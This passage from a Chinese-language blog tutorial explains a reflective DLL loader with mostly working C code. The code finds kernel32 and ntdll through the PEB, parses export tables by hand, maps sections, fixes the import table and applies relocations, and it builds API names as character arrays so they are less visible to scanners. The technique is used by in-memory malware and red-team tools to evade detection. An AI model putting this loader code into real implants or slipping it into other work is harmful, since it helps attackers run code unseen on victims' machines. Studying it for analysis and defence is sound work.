<li>IAT（导入表）可能还没修好（或者不想依赖它）</li>
<li>也不想显式调用 <code>GetProcAddress/LoadLibrary</code>（因为你自己要“当 loader”）</li>
<li>但又必须拿到一些基础 API（VirtualAlloc&#x2F;VirtualProtect&#x2F;LoadLibrary&#x2F;NtFlushInstructionCache…）才能继续往下做</li>
</ul>
<p>所以就需要一条自举路径</p>
<blockquote>
<p>从当前进程已加载模块列表里找到 kernel32&#x2F;ntdll,再手工解析它们的 PE 导出表，找到函数地址,遇到导出转发时再递归解析</p>
</blockquote>
<p>通过GPAR(GMHR(kernel32), virtualAlloc)这样的方式来获取系统 api，GMHR 是获取 dll 句柄的函数，GPAR 的功能是通过句柄获取对应导出表函数地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ((VA = (fnVirtualAlloc)GPAR(GMHR(kernel32), virtualAlloc)) == NULL)</span><br><span class="line">        return FALSE;</span><br><span class="line">    if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(VP = (fnVirtualProtect)GPAR(GMHR(kernel32), virtualProtect)))</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(RAFT = (fnRtlAddFunctionTable)GPAR(GMHR(kernel32), rtladdFunctionTable)))</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(FIC = (fnNtFlushInstructionCache)GPAR(GMHR(ntdll), ntFlushInstructionCache)))</span><br><span class="line">        return FALSE;</span><br></pre></td></tr></table></figure>

<p>在 GMHR 函数中，我们通过 PEB 来获取想要获取的函数所在 dll 的句柄。（关于 peb 的知识可以看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13556%EF%BC%89">https://xz.aliyun.com/t/13556）</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//----------------GET MODULE HANDLE---------------------</span><br><span class="line">HMODULE GMHR(IN WCHAR szModuleName[]) &#123;   </span><br><span class="line">    PPEBC                   pPeb = (PEBC*)(__readgsqword(0x60));</span><br><span class="line">    // geting Ldr</span><br><span class="line">    PPEBC_LDR_DATA          pLdr = (PPEBC_LDR_DATA)(pPeb-&gt;Ldr);</span><br><span class="line">    // getting the first element in the linked list (contains information about the first module)</span><br><span class="line">    PLDR_DATA_TABLE_ENTRYC  pDte = (PLDR_DATA_TABLE_ENTRYC)(pLdr-&gt;InMemoryOrderModuleList.Flink);</span><br><span class="line"></span><br><span class="line">    while (pDte) &#123;</span><br><span class="line">        // if not null</span><br><span class="line">        if (pDte-&gt;FullDllName.Length != NULL) &#123;</span><br><span class="line"></span><br><span class="line">            // check if both equal</span><br><span class="line">            ToLowerCaseWIDE(pDte-&gt;FullDllName.Buffer);</span><br><span class="line">            ToLowerCaseWIDE(szModuleName);</span><br><span class="line">            if (CompareStringWIDE(pDte-&gt;FullDllName.Buffer, szModuleName)) &#123;</span><br><span class="line"></span><br><span class="line">                return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        // next element in the linked list</span><br><span class="line">        pDte = *(PLDR_DATA_TABLE_ENTRYC*)(pDte);</span><br><span class="line">    &#125;  </span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面获取的句柄是指向内存中模块开头的指针，因此我们可以解析 dll 的 PE 标头，获取函数导出表，并且依次进行比较，并且我们的代码考虑了函数转发的情况，函数转发指的是一个 DLL 可以将其导出的函数指向另一个 DLL 的函数，通过转发，系统可以避免重复实现相同的功能。</p>
<p>GMHR：通过 PEB 找到某个 DLL 的模块基址（HMODULE）</p>
<p>这段 GMHR 在做的事情：</p>
<ol>
<li>通过 GS 寄存器读出 PEB 指针</li>
<li>从 <code>PEB-&gt;Ldr</code> 拿到 Loader 数据结构</li>
<li>遍历 <code>InMemoryOrderModuleList</code> 链表</li>
<li>比较每个模块的 <code>FullDllName</code> &#x2F; <code>BaseDllName</code>，找到名字匹配的模块</li>
<li>返回该模块的句柄（本质上就是<strong>模块在内存中的基址</strong>）</li>
</ol>
<p>关键点解释：</p>
<ul>
<li><strong>PEB（Process Environment Block）</strong>：进程里一个很重要的结构，里面有 loader 维护的已加载模块链表。</li>
<li><code>Ldr-&gt;InMemoryOrderModuleList</code>：链表节点指向每个已加载模块的信息结构（常见是 <code>LDR_DATA_TABLE_ENTRY</code>）。</li>
<li>HMODULE 是模块句柄：在 Windows 里，<strong>HMODULE 通常就是模块映像基址</strong>，也就是 DLL 映射到内存的起始地址。</li>
</ul>
<blockquote>
<p>Windows 的函数不是散落的，每个API都属于某个模块（DLL）。</p>
<table>
<thead>
<tr>
<th>API</th>
<th>所在 DLL</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAlloc</td>
<td>kernel32.dll</td>
</tr>
<tr>
<td>VirtualProtect</td>
<td>kernel32.dll</td>
</tr>
<tr>
<td>LoadLibraryA</td>
<td>kernel32.dll</td>
</tr>
<tr>
<td>NtFlushInstructionCache</td>
<td>ntdll.dll</td>
</tr>
<tr>
<td>MessageBoxA</td>
<td>user32.dll</td>
</tr>
</tbody></table>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------获取函数地址-------------------*/</span></span><br><span class="line"></span><br><span class="line">FARPROC <span class="title function_">GPAR</span><span class="params">(IN HMODULE hModule, IN CHAR lpApiName[])</span> &#123;</span><br><span class="line">    <span class="comment">// 获取模块的基地址</span></span><br><span class="line">    PBYTE pBase = (PBYTE)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;</span><br><span class="line">    <span class="comment">// 检查DOS头的魔数是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 检查NT头的签名是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取可选头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;</span><br><span class="line">    <span class="comment">// 获取导出目录表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取函数名数组、函数地址数组和函数序号数组</span></span><br><span class="line">    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);</span><br><span class="line">    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于处理转发的变量</span></span><br><span class="line">    WCHAR kernel32[] = &#123; <span class="string">L&#x27;K&#x27;</span>, <span class="string">L&#x27;e&#x27;</span>, <span class="string">L&#x27;r&#x27;</span>, <span class="string">L&#x27;n&#x27;</span>, <span class="string">L&#x27;e&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;3&#x27;</span>, <span class="string">L&#x27;2&#x27;</span>, <span class="string">L&#x27;.&#x27;</span>, <span class="string">L&#x27;d&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    CHAR loadLibraryA[] = &#123; <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    fnLoadLibraryA LLA = <span class="literal">NULL</span>;</span><br><span class="line">    PBYTE functionAddress = <span class="literal">NULL</span>;</span><br><span class="line">    CHAR forwarder[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR dll[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR function[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有导出的函数</span></span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取函数名</span></span><br><span class="line">        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找指定的函数名</span></span><br><span class="line">        <span class="keyword">if</span> (ComprareStringASCII(lpApiName, pFunctionName)) &#123;</span><br><span class="line">            <span class="comment">// 获取函数地址</span></span><br><span class="line">            functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查函数是否是转发</span></span><br><span class="line">            <span class="keyword">if</span> (functionAddress &gt;= (PBYTE)pImgExportDir &amp;&amp; functionAddress &lt; (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) &#123;    </span><br><span class="line">                <span class="comment">// 处理转发字符串</span></span><br><span class="line">                ParseForwarder((CHAR*)functionAddress, dll, function);</span><br><span class="line">                <span class="keyword">if</span> ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == <span class="literal">NULL</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">if</span> (function[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 处理转发到指定序号的情况</span></span><br><span class="line">                    <span class="keyword">return</span> GPARO(LLA(dll), custom_stoi(function));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 处理转发到指定函数名的情况</span></span><br><span class="line">                    <span class="keyword">return</span> GPAR(LLA(dll), function);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 返回非转发函数的地址</span></span><br><span class="line">                <span class="keyword">return</span> (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好的，到现在位置我们就可以获取到我们所需要的系统 api 了</p>
<h3 id="申请-dll-所需要的内存空间"><a href="#申请-dll-所需要的内存空间" class="headerlink" title="申请 dll 所需要的内存空间"></a>申请 dll 所需要的内存空间</h3><p>虽然我们的 dll pe 已经在内存里面了，但是我们还需要更大的一个内存空间对其加载，完成映射节，解析导入表，重定位表等等操作，因此我们需要一片更大的内存空间，我们直接在上面获取系统 api 的步骤中获取 VirtualAlloc 即可，而所需要的内存空间大小是 pe 文件格式里面 IMAGE_OPTIONAL_HEADER 的SizeOfImage 确定</p>
<blockquote>
<p> dll pe：这个 DLL 文件的 PE 格式结构数据（原始文件内容）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((pebase = (PBYTE)VA(NULL, pImgOptHdr-&gt;SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)</span><br><span class="line">        return FALSE;</span><br></pre></td></tr></table></figure>

<h3 id="复制节"><a href="#复制节" class="headerlink" title="复制节"></a>复制节</h3><p>我们接下来要把节映射过去，由于节在内存中应该是虚拟地址，所以我们不能一股脑复制过去，要借助IMAGE_SECTION_HEADER 里面的VirtualAddress 字段帮助我们复制</p>
<p>为什么不能一股脑复制整个 DLL？</p>
<p>因为现在手里 <code>dllBaseAddress</code> 指向的是 <strong>原始 PE 文件字节（文件布局）</strong>，文件布局的特点是：</p>
<ul>
<li>节区在文件里按 <code>PointerToRawData</code> 排列（文件偏移）</li>
<li>节区大小按 <code>SizeOfRawData</code>（文件对齐 FileAlignment）</li>
<li>节区位置和间隔不等同于运行时的虚拟地址布局</li>
</ul>
<p>而运行时真正执行时，CPU&#x2F;代码访问的是：</p>
<ul>
<li><strong>RVA（VirtualAddress）</strong> 为基准的布局（内存对齐 SectionAlignment）</li>
<li>例如 <code>.text</code> 通常从 RVA 0x1000 开始，而不是文件偏移 0x400</li>
</ul>
<p>所以必须按节映射，把：文件偏移 → 拷到 → 内存虚拟地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为节头（section headers）数组分配内存</span></span><br><span class="line">peSections = (PIMAGE_SECTION_HEADER*)custom_malloc((<span class="keyword">sizeof</span>(PIMAGE_SECTION_HEADER) * ImgFileHdr.NumberOfSections), VA);</span><br><span class="line"><span class="keyword">if</span> (peSections == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将节的指针保存到节头数组中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line">    <span class="comment">// 计算每个节头的位置并保存到 peSections 数组中</span></span><br><span class="line">    peSections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + <span class="number">4</span> + <span class="number">20</span> + ImgFileHdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每个节的内容从原始 PE 文件中复制到内存中的相应位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line">    custom_memcpy(</span><br><span class="line">        <span class="comment">// 目标地址：在内存中的虚拟地址</span></span><br><span class="line">        (PVOID)(pebase + peSections[i]-&gt;VirtualAddress),</span><br><span class="line">        <span class="comment">// 源地址：原始 PE 文件中的偏移地址</span></span><br><span class="line">        (PVOID)(dllBaseAddress + peSections[i]-&gt;PointerToRawData),</span><br><span class="line">        <span class="comment">// 复制的大小</span></span><br><span class="line">        peSections[i]-&gt;SizeOfRawData</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="修复导入表-IAT"><a href="#修复导入表-IAT" class="headerlink" title="修复导入表 IAT"></a>修复导入表 IAT</h2><p>一旦各个节被加载到正确的虚拟地址中，所有的相对虚拟地址（RVA）就开始有意义了。因此，在这里我们可以开始修复导入目录（Import Directory）：遍历我们反射 DLL 需要操作的所有 DLL 列表，导入它们，并根据我们在内存中获得的位置调整每个函数的 RVA。基本上将所有的 RVA 转换为 VA（虚拟地址），即 VA &#x3D; ImageBase + RVA。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += <span class="keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR)) &#123;</span><br><span class="line">        <span class="comment">// 获取图像导入描述符的指针</span></span><br><span class="line">        pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pebase + pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用自定义的GetModuleHandle/GetProcAddress来导入DLL</span></span><br><span class="line">        dll = LLA((LPSTR)(pebase + pImgImpDesc-&gt;Name));</span><br><span class="line">        <span class="keyword">if</span> (dll == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取ILT和IAT的引用</span></span><br><span class="line">        pOriginalFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc-&gt;OriginalFirstThunk);</span><br><span class="line">        pFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc-&gt;FirstThunk);</span><br><span class="line">        <span class="comment">// 如果引用不为空</span></span><br><span class="line">        <span class="keyword">while</span> (pOriginalFirstThunk-&gt;u1.Function != <span class="literal">NULL</span> &amp;&amp; pFirstThunk-&gt;u1.Function != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 检查函数是通过序号引用还是通过名称引用的</span></span><br><span class="line">            <span class="keyword">if</span> (pOriginalFirstThunk-&gt;u1.Ordinal &amp; <span class="number">0x8000000000000000</span>) &#123;</span><br><span class="line">                <span class="comment">// 通过保留低16位来获取序号的字节</span></span><br><span class="line">                ordinal = pOriginalFirstThunk-&gt;u1.Ordinal &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">                <span class="comment">// 获取函数地址</span></span><br><span class="line">                funcAddress = GPARO(dll, (<span class="type">int</span>)ordinal);</span><br><span class="line">                <span class="keyword">if</span> (funcAddress != nullptr)</span><br><span class="line">                    <span class="comment">// 调整IAT表（返回的地址与DllBaseAddress相加）</span></span><br><span class="line">                    pFirstThunk-&gt;u1.Function = (ULONGLONG)funcAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果函数可以通过其名称找到</span></span><br><span class="line">                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pebase + pOriginalFirstThunk-&gt;u1.AddressOfData);</span><br><span class="line">                funcAddress = GPAR(dll, pImgImportByName-&gt;Name);</span><br><span class="line">                <span class="keyword">if</span> (funcAddress != nullptr)</span><br><span class="line">                    pFirstThunk-&gt;u1.Function = (ULONGLONG)funcAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 移动到下一个</span></span><br><span class="line">            pOriginalFirstThunk++;</span><br><span class="line">            pFirstThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="修复重定位表"><a href="#修复重定位表" class="headerlink" title="修复重定位表"></a>修复重定位表</h2><p>现在，导入地址表也已修复，这意味着如果DLL在该进程的内存中执行，它将知道在哪里找到所需的函数。现在是应用基址重定位的时候了，我们可以简要说明一下重定位的工作原理：当程序被编译时，编译器假定一个特定的基址作为可执行文件的基址。然后基于这个基址计算并嵌入了各种地址。然而，可执行文件加载时不太可能正好加载到这个基址。相反，它可能加载到一个不同的地址，这使得所有这些嵌入的地址无效。为了解决这个加载问题，一个包含所有这些需要调整的嵌入地址的列表被存储在PE文件的一个专门表中，称为重定位表（Relocation Table）。这个表位于.reloc节的一个数据目录中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*--------------修复重定位--------------*/</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 计算delta，即实际基地址与期望基地址的差值</span></span><br><span class="line"> delta = (ULONG_PTR)pebase - pImgOptHdr-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取重定位表的起始地址</span></span><br><span class="line"> pImgRelocation = (PIMAGE_BASE_RELOCATION)(pebase + pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 遍历所有的重定位块</span></span><br><span class="line"> <span class="keyword">while</span> (pImgRelocation-&gt;VirtualAddress) &#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 获取第一个重定位条目的地址</span></span><br><span class="line">     pRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgRelocation + <span class="number">1</span>);</span><br><span class="line">     <span class="comment">// 计算重定位条目的数量（移除头部大小并除以每个条目的大小）</span></span><br><span class="line">     entriesCount = (<span class="type">int</span>)((pImgRelocation-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 遍历所有的重定位条目</span></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; entriesCount; i++) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 根据重定位类型进行处理</span></span><br><span class="line">         <span class="keyword">switch</span> (pRelocEntry-&gt;Type) &#123;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_DIR64:</span><br><span class="line">         &#123;<span class="comment">// 如果类型为IMAGE_REL_BASED_DIR64（即值为10）</span></span><br><span class="line">             <span class="comment">// 对64位字段应用delta值</span></span><br><span class="line">             ULONGLONG* toAdjust = (ULONGLONG*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += (ULONGLONG)delta;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_HIGHLOW:</span><br><span class="line">             <span class="comment">// 对32位字段应用delta值</span></span><br><span class="line">         &#123;</span><br><span class="line">             DWORD* toAdjust = (DWORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += (DWORD)delta;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_HIGH:</span><br><span class="line">             <span class="comment">// 对16位高字段应用delta值的高16位</span></span><br><span class="line">         &#123;</span><br><span class="line">             WORD* toAdjust = (WORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += HIWORD(delta);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_LOW:</span><br><span class="line">             <span class="comment">// 对16位低字段应用delta值的低16位</span></span><br><span class="line">         &#123;</span><br><span class="line">             WORD* toAdjust = (WORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += LOWORD(delta);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_ABSOLUTE:</span><br><span class="line">             <span class="comment">// 跳过此类型的重定位。该类型可以用来填充块</span></span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 移动到下一个重定位条目</span></span><br><span class="line">         pRelocEntry++;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 移动到下一个重定位块</span></span><br><span class="line">     pImgRelocation = (PIMAGE_BASE_RELOCATION)(reinterpret_cast&lt;DWORD_PTR&gt;(pImgRelocation) + pImgRelocation-&gt;SizeOfBlock);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="为每个节分配正确的内存属性"><a href="#为每个节分配正确的内存属性" class="headerlink" title="为每个节分配正确的内存属性"></a>为每个节分配正确的内存属性</h2><p>我们根据IMAGE_SECTION_HEADER 的Characteristics 字段确定每个节的属性然后为其分配即可</p>
<blockquote>
